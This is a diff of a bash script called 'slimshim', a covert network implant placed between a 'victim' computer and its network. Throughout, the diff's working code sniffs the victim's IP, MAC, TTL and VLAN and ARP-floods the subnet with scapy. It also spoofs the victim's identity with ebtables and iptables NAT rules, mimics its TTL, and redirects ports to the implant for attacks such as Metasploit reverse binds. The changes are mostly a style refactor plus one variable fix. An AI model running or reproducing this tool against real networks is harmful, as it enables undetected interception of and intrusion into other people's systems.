@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20161008 Kirby
+# 20170327 Kirby
 
 ################################################################################
 # LICENSE
@@ -19,6 +19,7 @@
 ################################################################################
 
 
+##shellcheck -e SC2086,SC2001 slimshim
 
 ################################################################################
 function do_guess() {
@@ -43,16 +44,19 @@ function do_guess() {
     tcpdump --help 2>&1 |grep -q '\-Q' && dirarg='-Q in'
 
     # eth0.2 on the Nexx WT3020 is in the center of the device.  Plug that interface into the victim.
-    if ip link show eth1 >/dev/null 2>&1; then
+    if ip link show eth1 >/dev/null 2>&1
+    then
         dev=eth1
-    elif ip link show eth0.2 >/dev/null 2>&1; then
+    elif ip link show eth0.2 >/dev/null 2>&1
+    then
         dev=eth0.2
     else
         echo "FATAL ERROR: you are missing either eth1 or eth0.2"
         exit 1
     fi
 
-    while :; do
+    while :
+    do
         # Determine the victim's IP/MAC by watching inbound packets on the interface.
         # It is critical that eth1 be plugged directly into the victim.
         tcpdumpcmd="tcpdump -v -c1 -e -nni $dev $dirarg $dumpargs"
@@ -68,30 +72,36 @@ function do_guess() {
         ttl=$(echo $sniff |sed -e 's/.* ttl \([0-9]*\), .*/\1/')
 
         # Sanity checks
-        if ! echo $sip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; then
+        if ! echo $sip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
+        then
             echo "# BAD SIP $sip"
             echo "# Gonna loop again"
             continue
         fi
-        if ! echo $smac |egrep -q "^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$"; then 
+        if ! echo $smac |egrep -q "^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$"
+        then 
             echo "# BAD SMAC $smac"
             echo "# Gonna loop again"
             continue
         fi
-        if ! echo $ttl |egrep -q "^[0-9]+$"; then 
+        if ! echo $ttl |egrep -q "^[0-9]+$"
+        then 
             echo "# BAD TTL $ttl"
             echo "# Gonna loop again"
             continue
         fi
-        if [ $ttl -lt 64 ]; then
+        if [[ $ttl -lt 64 ]]
+        then
             echo "# WARNING: ttl $ttl is probably not right.  This may be a bad sniff.  Setting to 64"
             ttl=64
         fi
 
         # Detect if this is an 802.1q network and grab the vlan id.
-        if echo $sniff |grep -q ' vlan '; then
+        if echo $sniff |grep -q ' vlan '
+        then
             vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
-            if ! echo $vlan |egrep -q "^[0-9]+$"; then 
+            if ! echo $vlan |egrep -q "^[0-9]+$"
+            then 
                 echo "# WTF.  Bad vlan $vlan.  Gonna ignore and not set the vlan."
                 vlan=''
             fi
@@ -119,7 +129,8 @@ function do_guess() {
         rmac=$(echo $sniff |awk '{print $2}')
         echo "rmac=$rmac"
 
-        if [ "$smac" == "$rmac" ]; then
+        if [[ "$smac" == "$rmac" ]]
+        then
             echo "############################################"
             echo "# BAD DATA"
             echo "# $sniff"
@@ -133,18 +144,19 @@ function do_guess() {
     echo "# Getting routerip."
     echo "# Wait until victim arp queries the router mac"
     echo "#      OR unplug and replug ethernet (to victim) to run quicker"
-    while :; do
-
+    while :
+    do
         # Do a 1 second off, 2 seconds on blink of power led
-        if [ -f "/sys/class/leds/nexx:blue:power/brightness" ]; then
+        if [[ -f "/sys/class/leds/nexx:blue:power/brightness" ]]
+        then
             led="/sys/class/leds/nexx:blue:power/brightness"
             touch /tmp/blink
             blinkled $led &
         fi
         
         # On some devices you can run ip link dev down/up to simulate the unplug, but it will break on OpenWRT/LEDE
-        grep -q Kali /etc/os-release 2>/dev/null
-        if [ $? == 0 ]; then
+        if grep -q Kali /etc/os-release 2>/dev/null
+        then
             echo "#"
             echo "# Turning off/on interfaces to speed this up"
             echo "# This will only work on hosts using dhcp"
@@ -158,10 +170,12 @@ function do_guess() {
         # Background it so we can catch it on the next tcpdump
         # YOU MAY WANT TO DISABLE THIS.  
         # This will flood the guessed network with arp requests in hopes of finding the router ip to match the route mac
-        if which scapy >/dev/null 2>&1; then
+        if which scapy >/dev/null 2>&1
+        then
             scapy=1
             echo "# Sending arp via scapy to the assumed network $netguess/24"
-            if [ x$vlan != 'x' ]; then
+            if [[ x$vlan != 'x' ]]
+            then
                 ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/Dot1Q(vlan=$vlan)/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
             else
                 ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
@@ -176,16 +190,19 @@ function do_guess() {
         echo "#"
         sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and arp 2>/dev/null)
         rip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
-        if [ "$rip" == "$sip" ]; then
+        if [[ "$rip" == "$sip" ]]
+        then
             echo "############################################"
             echo "# BAD DATA"
             echo "# $sniff"
             echo "############################################"
-        elif echo $rip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; then
+        elif echo $rip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
+        then
             echo "#"
             echo "# PACKET: $sniff"
             echo "#"
-            if [ $scapy == 1 ]; then
+            if [[ $scapy == 1 ]]
+            then
                 kill %1 >/dev/null 2>&1
             fi
             break
@@ -195,10 +212,12 @@ function do_guess() {
         echo "# $sniff"
         echo "############################################"
     done
-    if [ $scapy == 1 ]; then
+    if [[ $scapy == 1 ]]
+    then
         kill %1 >/dev/null 2>&1
     fi
-    if [ -f "/tmp/blink" ]; then
+    if [[ -f "/tmp/blink" ]]
+    then
         rm /tmp/blink
         echo 0 > $led
     fi
@@ -214,7 +233,8 @@ function do_guess() {
 ################################################################################
 function blinkled() {
     local ledfile=$1
-    while [ -f /tmp/blink ]; do
+    while [[ -f /tmp/blink ]]
+    do
         echo 1 > $ledfile
         sleep 1
         echo 0 > $ledfile
@@ -238,16 +258,17 @@ function do_getdns() {
     echo 'nameserver 8.8.8.8' > /etc/resolv.conf
 
     # Loop the sniffer until we have a valid IP and make it the primary nameserver
-    while ! echo $dns |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; do
+    while ! echo $dns |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
+    do
         sniff=$(tcpdump -c1 -nni br-lan "not ip6 and udp and dst port 53" 2>/dev/null)
         # 04:40:30.876500 IP 192.168.1.19.59369 > 192.168.1.1.53: 13937+ A? cnn.com. (25)
         dns=$(echo $sniff |sed -e 's/.* > \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]*: .*/\1/')
-        grep -q $dns /etc/resolv.conf
-        if [ $? != 0 ]; then
+        if ! grep -q $dns /etc/resolv.conf
+        then
             echo "nameserver $dns" > /etc/resolv.conf
         fi
-        grep -q 8.8.8.8 /etc/resolv.conf
-        if [ $? != 0 ]; then
+        if ! grep -q 8.8.8.8 /etc/resolv.conf
+        then
             echo "nameserver 8.8.8.8" >> /etc/resolv.conf
         fi
     done
@@ -263,34 +284,40 @@ function do_arpwatch()
 
     # This is a forever loop.  
     # We continuously watch for arps and add to the arptable and route table.
-    while :; do
-        if brctl show |grep -q br-lan; then
+    while :
+    do
+        if brctl show |grep -q br-lan
+        then
             sniff=$(tcpdump -v -e -c1 -nni br-lan arp 2>/dev/null)
             ip=''
             mac=''
-            if echo $sniff |grep -q ' vlan '; then
+            if echo $sniff |grep -q ' vlan '
+            then
                 vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
                 brdev="br-lan.$vlan"
             else
                 vlan=''
                 brdev='br-lan'
             fi
-            if echo $sniff |grep -q is-at; then
+            if echo $sniff |grep -q is-at
+            then
                 mac=$(echo $sniff |sed 's/.* is-at \(.*\), .*/\1/')
                 ip=$(echo $sniff |sed 's/.* Reply \(.*\) is-at .*/\1/')
             fi
-            if echo $sniff |grep -q who-has; then
+            if echo $sniff |grep -q who-has
+            then
                 mac=$(echo $sniff |awk '{print $2}')
                 ip=$(echo $sniff |sed -e 's/.* tell \(.*\), .*/\1/')
             fi
-            if [ x$ip != 'x' ] \
-            && [ x$mac != 'x' ] \
-            && [ $ip != ${ARGS[myip]} ] \
-            && [ $ip != '0.0.0.0' ] \
-            && [ $mac != ${ARGS[mymac]} ] \
-            && [ $mac != 'ff:ff:ff:ff:ff:ff' ]
+            if [[ -n $ip                      ]] \
+            && [[ -n $mac                     ]] \
+            && [[ $ip  != "${ARGS[myip]}"     ]] \
+            && [[ $ip  != '0.0.0.0'           ]] \
+            && [[ $mac != "${ARGS[mymac]}"    ]] \
+            && [[ $mac != 'ff:ff:ff:ff:ff:ff' ]]
             then
-                if ! ip neigh |egrep  "^$ip " |grep -q $mac; then
+                if ! ip neigh |egrep  "^$ip " |grep -q $mac
+                then
                     echo $sniff
                     echo "adding arp for $ip and $mac"
                     ip neigh replace $ip lladdr $mac dev $brdev >/dev/null 2>&1
@@ -307,13 +334,14 @@ function do_arpwatch()
 function redirectEgressIP()
 {
 # redirect outbound traffic from victim($sip) to destination($dip)
-    if [ x${ARGS[newdip]} == 'x' ]; then
+    if [[ -z ${ARGS[newdip]} ]]
+    then
         ARGS[newdip]=${ARGS[myip]}
     fi
-    if [ x${ARGS[sip]} == 'x' ] \
-    || [ x${ARGS[origdip]} == 'x' ] \
-    || [ x${ARGS[newdip]} == 'x' ] \
-    || [ x${ARGS[mymac]} == 'x' ]
+    if [[ -z ${ARGS[sip]}     ]] \
+    || [[ -z ${ARGS[origdip]} ]] \
+    || [[ -z ${ARGS[newdip]}  ]] \
+    || [[ -z ${ARGS[mymac]}   ]]
     then
         echo "FAILURE: invalid args"
         exit 1
@@ -326,12 +354,12 @@ function redirectEgressIP()
 function redirectEgressPort()
 {
 # redirect outbound traffic from victim($sip) to destination($dip) for port $dstport
-    if [ x${ARGS[dstport]} == 'x' ] \
-    || [ x${ARGS[proto]} == 'x' ] \
-    || [ x${ARGS[sip]} == 'x' ] \
-    || [ x${ARGS[origdip]} == 'x' ] \
-    || [ x${ARGS[newdip]} == 'x' ] \
-    || [ x${ARGS[mymac]} == 'x' ]
+    if [[ -z ${ARGS[dstport]} ]] \
+    || [[ -z ${ARGS[proto]}   ]] \
+    || [[ -z ${ARGS[sip]}     ]] \
+    || [[ -z ${ARGS[origdip]} ]] \
+    || [[ -z ${ARGS[newdip]}  ]] \
+    || [[ -z ${ARGS[mymac]}   ]]
     then
         echo "FAILURE: invalid args"
         exit 1
@@ -343,12 +371,12 @@ function redirectEgressPort()
 ################################################################################
 function redirectIngressPort() {
 # redirect traffic going to victim IP($sip) on $rdrport to the SlimShim on $dstport
-    if [ x${ARGS[proto]} == 'x' ] \
-    || [ x${ARGS[sip]} == 'x' ] \
-    || [ x${ARGS[rdrport]} == 'x' ] \
-    || [ x${ARGS[dstport]} == 'x' ] \
-    || [ x${ARGS[myip]} == 'x' ] \
-    || [ x${ARGS[mymac]} == 'x' ]
+    if [[ -z ${ARGS[proto]}   ]] \
+    || [[ -z ${ARGS[sip]}     ]] \
+    || [[ -z ${ARGS[rdrport]} ]] \
+    || [[ -z ${ARGS[dstport]} ]] \
+    || [[ -z ${ARGS[myip]}    ]] \
+    || [[ -z ${ARGS[mymac]}   ]]
     then
         echo "FAILURE: invalid args"
         exit 1
@@ -360,27 +388,27 @@ function redirectIngressPort() {
 ################################################################################
 function redirectIngressPorts() {
 # redirct multiple ports(begin:end) to SlimShim.  Useful for reverse-bind attacks in Metasploit
-    if [ x${ARGS[proto]} == 'x' ] \
-    || [ x${ARGS[sip]} == 'x' ] \
-    || [ x${ARGS[rdrport]} == 'x' ] \
-    || [ x${ARGS[dstport]} == 'x' ] \
-    || [ x${ARGS[myip]} == 'x' ] \
-    || [ x${ARGS[mymac]} == 'x' ]
+    if [[ -z ${ARGS[proto]}   ]] \
+    || [[ -z ${ARGS[sip]}     ]] \
+    || [[ -z ${ARGS[rdrport]} ]] \
+    || [[ -z ${ARGS[dstport]} ]] \
+    || [[ -z ${ARGS[myip]}    ]] \
+    || [[ -z ${ARGS[mymac]}   ]]
     then
         echo "FAILURE: invalid args"
         exit 1
     fi
     set -x
-    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto -m multiport --dports $rdrports -j DNAT --to-destination $myip
+    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination $myip
     set +x
 }
 ################################################################################
 function addLan() {
 # add a lan to the shim, e.g. wifi or openvpn on the SlimShim device
-    if [ x${ARGS[lan]} == 'x' ] \
-    || [ x${ARGS[sip]} == 'x' ] \
-    || [ x${ARGS[rip]} == 'x' ] \
-    || [ x${ARGS[dynports]} == 'x' ]
+    if [[ -z ${ARGS[lan]}      ]] \
+    || [[ -z ${ARGS[sip]}      ]] \
+    || [[ -z ${ARGS[rip]}      ]] \
+    || [[ -z ${ARGS[dynports]} ]]
     then
         echo "FAILURE: invalid args"
         exit 1
@@ -445,7 +473,8 @@ function do_envwrite()
     # Write variables to env file
     local envfile="/root/slimshim.env"
     rm -f $envfile 2>/dev/null
-    for i in "${!ARGS[@]}"; do
+    for i in "${!ARGS[@]}"
+    do
         echo "$i=${ARGS[$i]}" >>$envfile
         echo "ARGS[$i]=${ARGS[$i]}" >>$envfile
     done
@@ -466,8 +495,8 @@ function do_runprep() {
     local int2
 
     do_clearall
-    which ip iptables ebtables modprobe brctl route ifconfig sysctl >/dev/null 2>&1 
-    if [ $? != 0 ]; then
+    if ! which ip iptables ebtables modprobe brctl route ifconfig sysctl >/dev/null 2>&1 
+    then
         echo "FATAL ERROR: you are missing one or more commands"
         echo "Make sure the following commands are in your path:"
         echo "ip iptables ebtables modprobe brctl route ifconfig sysctl"
@@ -483,10 +512,12 @@ function do_runprep() {
     # ADJUST FOR THE INTERFACES YOU HAVE
     # NEXX devices only have eth0.1 and eth0.2
     # WARNING: OpenWRT/LEDE devices will fail if you haven't configured the interfaces to tag with the cpu interface
-    if ip link show eth1 >/dev/null 2>&1; then
+    if ip link show eth1 >/dev/null 2>&1
+    then
         int1=eth0
         int2=eth1
-    elif ip link show eth0.2 >/dev/null 2>&1; then
+    elif ip link show eth0.2 >/dev/null 2>&1
+    then
         int1=eth0.1
         int2=eth0.2
     else
@@ -499,8 +530,8 @@ function do_runprep() {
 
     ifconfig $int1 -arp up
     ifconfig $int2 -arp up
-    brctl show br-lan 2>&1 |grep -q "No such device" 
-    if [ $? == 0 ]; then
+    if brctl show br-lan 2>&1 |grep -q "No such device" 
+    then
         brctl addbr br-lan
         brctl addif br-lan $int1
         brctl addif br-lan $int2
@@ -509,12 +540,14 @@ function do_runprep() {
     ip link set dev br-lan address ${ARGS[mymac]} arp off || gotofail=1
     #route add default dev br-lan >/dev/null 2>&1
 
-    while ip route |grep -q default; do
+    while ip route |grep -q default
+    do
         defaultroute=$(ip route |grep default |head)
         ip route delete $defaultroute >/dev/null 2>&1
     done
 
-    if [ $gotofail == 1 ]; then
+    if [[ $gotofail == 1 ]]
+    then
         echo "FATAL ERROR: do_runprep function failed"
         exit 1
     fi
@@ -535,9 +568,11 @@ function do_shim()
     # just to make sure we're ready
     do_runprep
     
-    if [ x${ARGS[vlan]} != 'x' ]; then
+    if [[ -n ${ARGS[vlan]} ]]
+    then
         modprobe 8021q >/dev/null 2>&1
-        if ! lsmod |grep -q 8021q; then
+        if ! lsmod |grep -q 8021q
+        then
             echo "ALERT: did not see 8021q kernel module via lsmod"
             echo "I hope you have it compiled in the kernel. proceeding..."
         fi
@@ -552,7 +587,8 @@ function do_shim()
     fi
     ARGS[brdev]=$brdev
 
-    if [ $gotofail == '1' ]; then
+    if [[ $gotofail == '1' ]]
+    then
         echo "FATAL ERROR: do_shim function failed"
         exit 1
     fi
@@ -560,7 +596,8 @@ function do_shim()
     set -x
     # slimshim going out
     ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
-    if [ x${ARGS[vlan]} != 'x' ]; then
+    if [[ -n ${ARGS[vlan]} ]]
+    then
         ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
     fi
     iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
@@ -569,7 +606,8 @@ function do_shim()
     
     # slimshim going to victim
     ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
-    if [ x${ARGS[vlan]} != 'x' ]; then
+    if [[ -n ${ARGS[vlan]} ]]
+    then
         ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
     fi
     iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
@@ -577,14 +615,15 @@ function do_shim()
     iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}
     
     # outside to victim
-    if [ x${ARGS[vlan]} == 'x' ]; then
+    if [[ -n ${ARGS[vlan]} ]]
+    then
+        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[smac]} -d ${ARGS[rmac]} -j dnat --to-destination ${ARGS[mymac]}
+        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[rmac]} -d ${ARGS[smac]} -j dnat --to-destination ${ARGS[mymac]}
+    else
         # EXPERIMENTAL
         #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto tcp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
         #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto udp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
         true
-    else
-        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[smac]} -d ${ARGS[rmac]} -j dnat --to-destination ${ARGS[mymac]}
-        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[rmac]} -d ${ARGS[smac]} -j dnat --to-destination ${ARGS[mymac]}
     fi
 
     iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p tcp -m tcp -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination ${ARGS[myip]}
@@ -596,7 +635,8 @@ function do_shim()
     
     # mimic the ttl
     # Note: this will fail on OpenWRT/LEDE until they upgrade
-    if [ x${ARGS[ttl]} != 'x' ]; then
+    if [[ -n ${ARGS[ttl]} ]]
+    then
         iptables -t mangle -A POSTROUTING -o $brdev -j TTL --ttl-set ${ARGS[ttl]}
     fi
 
@@ -616,13 +656,14 @@ function do_shim()
 ################################################################################
 ################################################################################
 
-if ! id |grep -q uid=0; then
+if ! id |grep -q uid=0
+then
     echo "You must be root to run this"
     exit 1
 fi
 
-which tcpdump awk sed cut grep egrep >/dev/null 2>&1
-if [ $? != 0 ]; then
+if ! which tcpdump awk sed cut grep egrep >/dev/null 2>&1
+then
     echo "# FAIL: you must install the following: tcpdump awk sed cut grep egrep"
     exit 1
 fi
@@ -683,7 +724,8 @@ case $1 in
 esac
 
 declare -A ARGS
-for i in "$@"; do
+for i in "$@"
+do
     case $i in
         --smac=*)
             ARGS[smac]="${i#*=}"
@@ -735,7 +777,8 @@ for i in "$@"; do
             ;;
         --envfile=*)
             envfile="${i#*=}"
-            if [ -f "$envfile" ]; then
+            if [[ -f "$envfile" ]]
+            then
                 . "$envfile"
             else
                 echo "No env file $envfile"
@@ -760,11 +803,12 @@ ARGS[dynports]='27000-32000'
 ARGS[rdrports]='27000:32000'
 # $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.
 
-if [ $COMMAND == 'do_shim' ]; then
-    if [ x$sip == 'x' ] \
-    || [ x$smac == 'x' ] \
-    || [ x$rip == 'x' ] \
-    || [ x$rmac == 'x' ]
+if [[ $COMMAND == 'do_shim' ]]
+then
+    if [[ -z $sip  ]] \
+    || [[ -z $smac ]] \
+    || [[ -z $rip  ]] \
+    || [[ -z $rmac ]]
     then
         echo "FAILURE: missing arguments"
         exit 1
